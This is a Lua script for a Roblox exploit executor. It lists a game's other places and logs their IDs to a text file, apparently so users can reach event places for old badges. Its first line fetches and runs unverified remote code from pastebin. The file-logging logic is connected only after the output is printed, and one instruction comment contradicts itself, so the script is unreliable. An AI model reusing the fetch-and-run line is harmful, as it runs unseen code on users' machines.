loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
--< Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/xrtzrr/scripts/main/SavePlaceIDs_of_UniversalPlaces.lua"))()
--< Game: Universal
--< Functionality: This script grabs the other PlaceIDs if the game has any other places.
--< For example, event-hosted places where you can get older badges, unless the badge is disabled by the game owner.
--< When you're done, go to your exploit folder and go to Workspace, the file should be named "PlaceIDs.txt"
--< If it's there, your executor doesn't support folders/files, or your executor doesn't work.

--> Made by @xrtzrr on github
writefile("PlaceIDs.txt", "")
local as=game:GetService("AssetService")
local pgs=as:GetGamePlacesAsync()

while true do
     for _,plc in pairs(pgs:GetCurrentPage()) do
          print("PlaceName: " .. plc.Name)
          print("PlaceID: " .. tostring(plc.PlaceId))
     end
     if pgs.IsFinished then
          break
     end
     pgs:AdvanceToNextPageAsync()
end

local lg=game:GetService("LogService")
lg.MessageOut:Connect(function(msg, type)
    appendfile("PlaceIDs.txt", msg.."\n")
end)
